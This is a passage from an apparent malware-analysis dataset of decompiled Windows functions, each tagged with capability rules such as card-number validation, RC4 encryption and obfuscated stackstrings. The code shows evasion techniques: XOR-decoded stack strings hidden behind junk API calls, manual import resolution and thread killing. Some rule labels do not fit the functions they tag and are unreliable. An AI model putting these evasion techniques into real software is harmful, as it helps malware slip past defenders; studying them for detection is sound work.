(iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 424
    },
    "0040b12e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.0040b12e(void)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    ushort var_30h;\n    uint var_2eh;\n    uint var_29h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uchar *var_13h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_2eh._0_1_ = 0x1a;\n    var_48h = 0x65167458;\n    var_44h = 0x7410393a;\n    var_40h = 0x745f5900;\n    var_3ch = 0x39316513;\n    var_38h = 0x590f741d;\n    var_34h = 0x65187452;\n    var_30h = 0x3934;\n    stack0xffffffcf = 0x49590a74;\n    var_29h._0_1_ = 0x74;\n    var_4h = 0x5;\n    var_29h._1_1_ = 5;\n    stack0xffffffd5 = 0x7392b65;\n    var_23h = 0x4c591174;\n    var_1fh = 0x2e650274;\n    var_1bh = 0x1c740c39;\n    var_17h = 0x74744359;\n    var_13h._0_1_ = 0x65;\n    stack0xffffffec = 0x65747439;\n    var_ch._0_1_ = 0x59;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x6d);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_8h = &var_48h - iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar5 != 0x1be4e) {\n            *(iVar8 + iVar4) = *(&var_13h + iVar8 % var_4h + 3) ^ (iVar8 + iVar4)[var_8h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x36);\n    uVar6 = fcn.0040afdd();\n    puVar7 = uVar6 % 0x38 + 8;\n    unique0x10000112 = puVar7;\n    if (puVar7 != NULL) {\n        var_8h = puVar7 * 2 + 2;\n        uVar3 = (*pcVar1)(8, var_8h);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar2 = stack0xffffffec;\n        if (puVar7 != NULL) {\n            var_4h = NULL;\n            puVar9 = puVar7;\n            for (iVar8 = var_8h; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            if (stack0xffffffec != NULL) {\n                do {\n                    iVar8 = fcn.0040afdd();\n                    *(puVar7 + var_4h * 2) = *(iVar4 + (iVar8 % 0x1a) * 2);\n                    var_4h = var_4h + 1;\n                } while (var_4h < puVar2);\n            }\n            *(puVar7 + puVar2 * 2) = 0;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return puVar7;\n}\n",
        "token_count": 1015
    },
    "0040bdbf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040bdbf(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 116
    },
    "0040bdde": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040bdde(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.0040bdbf();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 354
    },
    "0040be64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040be64(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 255
    },
    "0040becb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040becb(uint hModule, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    \n    if ((arg_ch == 0) && (arg_ch = arg_10h,  arg_10h == 0)) {\n        uVar1 = 0xc000007b;\n    }\n    else {\n        puVar3 = in_ECX + arg_ch;\n        if (puVar3 == NULL) {\n            uVar1 = 0xc000007b;\n        }\n        else {\n            uVar2 = *puVar3;\n            if (uVar2 != 0) {\n                iVar4 = (in_ECX + arg_10h) - puVar3;\n                do {\n                    if (uVar2 < 0x80000000) {\n                        uVar2 = uVar2 + 2 + in_ECX;\n                    }\n                    else {\n                        uVar2 = uVar2 & 0xffff;\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hModule, uVar2);\n                    *(iVar4 + puVar3) = uVar1;\n                    puVar3 = puVar3 + 1;\n                    uVar2 = *puVar3;\n                } while (uVar2 != 0);\n            }\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 339
    },
    "0040bf33": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040bf33(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpModuleName;\n    uint phModule;\n    \n    iVar2 = *0x41dad8;\n    iVar4 = *(*(*0x41dad8 + 0x3c) + 0x80 + *0x41dad8);\n    if (iVar4 == 0) {\n        uVar3 = 0xc000000d;\n    }\n    else {\n        puVar6 = iVar4 + *0x41dad8;\n        if (puVar6 == NULL) {\n            uVar3 = 0xc000000d;\n        }\n        else {\n            iVar4 = puVar6[3];\n            while (iVar4 != 0) {\n                if (iVar4 + iVar2 != 0) {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar4 + iVar2);\n                    if (iVar4 == 0) break;\n                    lpModuleName._0_1_ = 0;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(iVar4, &lpModuleName, 0x104);\n                    if (iVar5 != 0) {\n                        (*_sym.imp.KERNEL32.dll_GetModuleHandleExA)(1, &lpModuleName, &phModule);\n                    }\n                    iVar4 = fcn.0040becb(iVar4, *puVar6, puVar6[4]);\n                    if (iVar4 != 0) break;\n                }\n                piVar1 = puVar6 + 8;\n                puVar6 = puVar6 + 5;\n                iVar4 = *piVar1;\n            }\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 424
    },
    "0040ce5d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040ce5d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_410h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    uVar2 = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    do {\n        if (0x3ff < uVar2) {\n            iVar1 = var_8h + uVar2;\n            puVar3 = &var_410h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            uVar2 = 0;\n            var_8h = iVar1;\n            param_1 = var_10h;\n        }\n        *(&var_410h + uVar2) = *(var_ch + param_1) ^ var_1h;\n        uVar2 = uVar2 + 1;\n        var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n        var_ch = var_ch + 1;\n    } while (var_ch < 0x184);\n    if (uVar2 != 0) {\n        puVar3 = &var_410h;\n        puVar4 = var_8h + param_1;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 499
    },
    "0040f608": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.0040f608(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x41dd90), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x41dd90));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 114
    },
    "0040236f": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040236f(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    uint var_8h;\n    uchar *var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_8h = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (var_4h != NULL) {\n        var_2ch = 0x2a18513a;\n        var_28h = 0x58073d54;\n        puVar8 = var_4h;\n        for (iVar6 = 0x1c; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_24h = 0x583d556a;\n        var_20h._0_1_ = 0x6a;\n        var_1ch = 0x446a3451;\n        var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x31);\n        uVar2 = (*pcVar5)(8, 0xe);\n        iVar6 = (*pcVar1)(uVar2);\n        var_10h = 5;\n        iVar7 = 0;\n        lpModuleName = iVar6;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n            if (iVar3 != 0x3644e2) {\n                *(iVar7 + iVar6) = *(&var_1ch + iVar7 % var_10h) ^ (iVar7 + iVar6)[&var_2ch - iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        var_2ch = 0x2e020a3a;\n        var_28h = 0x32002b1b;\n        var_24h = 0x331c3f05;\n        var_20h._0_1_ = 0x6c;\n        var_1ch = 0x5a70636c;\n        var_18h._0_2_ = 0x4a6e;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_10h = &var_2ch - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            iVar3 = lpModuleName;\n            if (iVar4 != 0x3fd70e) {\n                var_10h = 6;\n                *(iVar7 + iVar6) = *(&var_1ch + iVar7 % 6) ^ (iVar7 + iVar6)[&var_2ch - iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar6);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (pcVar5 != NULL) {\n            (*pcVar5)(fcn.0040236f, var_4h, 0x1c);\n            var_8h = *(var_4h + 4);\n        }\n        uVar2 = (*pcVar1)(0, var_4h);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*pcVar1)(uVar2);\n        uVar2 = (*pcVar5)(0, iVar3);\n        (*pcVar1)(uVar2);\n    }\n    return var_8h;\n}\n",
        "token_count": 1078
    },
    "00405f69": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00405f69(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_2ch = 0x293d2418;\n    var_28h = 0x3a63673b;\n    var_24h = 0x32322334;\n    var_20h._0_2_ = 0x3519;\n    var_20h._2_1_ = 0x4c;\n    var_1ch = 0x466a5751;\n    var_18h._0_1_ = 0x4c;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_8h = 5;\n    iVar7 = 0;\n    var_ch = &var_2ch - iVar4;\n    var_10h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar5 != 0x6626e4) {\n            *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xf);\n    var_2ch = 0x2a18513a;\n    var_28h = 0x58073d54;\n    var_24h = 0x583d556a;\n    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x6a);\n    var_1ch = 0x446a3451;\n    var_18h._0_1_ = 0x31;\n    uVar3 = (*pcVar1)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_ch = &var_2ch - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        iVar5 = var_10h;\n        if (iVar6 != 0x3644e2) {\n            *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n    *0x41e1e0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    if (*0x41e1e0 != NULL) {\n        iVar7 = (**0x41e1e0)(var_14h, &var_4h);\n        var_4h = -(iVar7 != 0) & var_4h;\n    }\n    uVar2 = var_4h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return uVar2;\n}\n",
        "token_count": 940
    },
    "00408622": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows",
            "accept command line arguments"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00408622(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_36h;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uchar var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_60h = 0xf01faf00;\n    var_5ch = 0x505600;\n    var_58h = 0x8002700;\n    var_54h = 0xc2900;\n    var_50h = 0x56900;\n    var_4ch = 0x3ff00;\n    var_48h = 0x1c4200;\n    var_44h = 0x163e00;\n    var_10h = 0;\n    _var_29h = CONCAT31(0x173b04, var_29h);\n    var_28h._3_1_ = 7;\n    var_24h = 0xf784c62;\n    var_20h = var_20h & 0xff000000 | 0x363938;\n    var_18h = 0x55546b56;\n    var_14h._0_2_ = 0x7836;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_8h = &var_28h - iVar5;\n    lpLibFileName = iVar5;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar6 != 0x4777dd) {\n            var_4h = 6;\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % 6) ^ (iVar11 + iVar5)[var_8h];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xb);\n    var_4h = 5;\n    var_2bh = 5;\n    var_30h = 0x50211122;\n    var_2ch = 0;\n    var_2ah = 1;\n    _var_29h = 0x24264029;\n    var_28h._3_1_ = 1;\n    var_24h = 0x19264139;\n    var_20h = 0x2f552110;\n    var_1ch = 0x77;\n    var_18h = 0x34486477;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x43);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_8h = &var_30h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar6 = lpLibFileName;\n        if (iVar7 != 0x331233) {\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % var_4h) ^ (iVar11 + iVar5)[&var_30h - iVar5];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x15);\n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    uVar10 = var_10h;\n    if (pcVar8 == NULL) {\n        uVar10 = 0;\n    }\n    else {\n        (*pcVar8)(&var_40h);\n        uVar3 = var_36h;\n        uVar2 = var_36h & 0xffffff;\n        var_36h = uVar2 | uVar10 << 0x18;\n        uVar9 = 0;\n        uVar1 = uVar10 & 0xff;\n        do {\n            if ((uVar1 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar2 << 0x18) == (&var_60h)[uVar9]) {\n                uVar10 = 1;\n            }\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < 8);\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*pcVar8)(uVar4);\n    return uVar10;\n}\n",
        "token_count": 1344
    },
    "004097d6": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004097d6(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0x2e020a3a;\n    var_20h = 0x32002b1b;\n    var_8h = 5;\n    var_1ch = 0x331c3f05;\n    var_18h = 0x6c;\n    var_14h = 0x5a70636c;\n    var_10h._0_2_ = 0x4a6e;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_ch = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar5 != 0x3fd70e) {\n            var_4h = 6;\n            *(iVar7 + iVar4) = *(&var_14h + iVar7 % 6) ^ (iVar7 + iVar4)[&var_24h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    var_24h = 0x2a18513a;\n    var_20h = 0x58073d54;\n    var_1ch = 0x583d556a;\n    var_18h = 0x6a;\n    var_14h = 0x446a3451;\n    var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x31);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_4h = &var_24h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        iVar5 = var_ch;\n        if (iVar6 != 0x3644e2) {\n            *(iVar7 + iVar4) = *(&var_14h + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_24h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_ch);\n    (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 805
    },
    "00409a70": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00409a70(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *0x41da84;\n    var_14h = param_1;\n    if (*0x41dd2c == NULL) {\n        var_4ch = 0x70272316;\n        var_48h = 0x31220470;\n        var_44h = 0x1b242824;\n        var_40h = 0x7572313f;\n        var_3ch = 0x2114230a;\n        var_38h = 0x23222525;\n        var_34h = 0x3f253527;\n        var_30h._0_2_ = 0x4428;\n        var_1ch = 0x46504c41;\n        var_18h._0_1_ = 0x44;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        var_8h = 5;\n        iVar7 = 0;\n        var_10h = iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n            if (iVar4 != 0xc6a350) {\n                *(iVar7 + iVar3) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar3)[&var_4ch - iVar3];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x1e);\n        var_2ch = 0x2a18513a;\n        var_28h = 0x58073d54;\n        var_24h = 0x583d556a;\n        var_20h._0_1_ = 0x6a;\n        var_1ch = 0x446a3451;\n        var_18h._0_1_ = 0x31;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_ch = &var_2ch - iVar3;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n            iVar4 = var_10h;\n            if (iVar5 != 0x3644e2) {\n                *(iVar7 + iVar3) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar3)[&var_2ch - iVar3];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, var_10h);\n        *0x41dd2c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*pcVar1)(0, iVar4);\n        (*pcVar6)(uVar2);\n        pcVar6 = *0x41dd2c;\n        if (*0x41dd2c == NULL) goto code_r0x00409bdd;\n    }\n    iVar3 = var_14h;\n    pcVar6 = (**0x41dd2c)(var_14h);\n    if (pcVar6 != '\\0') {\n        *0x41da84 = iVar3 != 0;\n    }\ncode_r0x00409bdd:\n    return pcVar6 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1105
    },
    "0040cc05": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
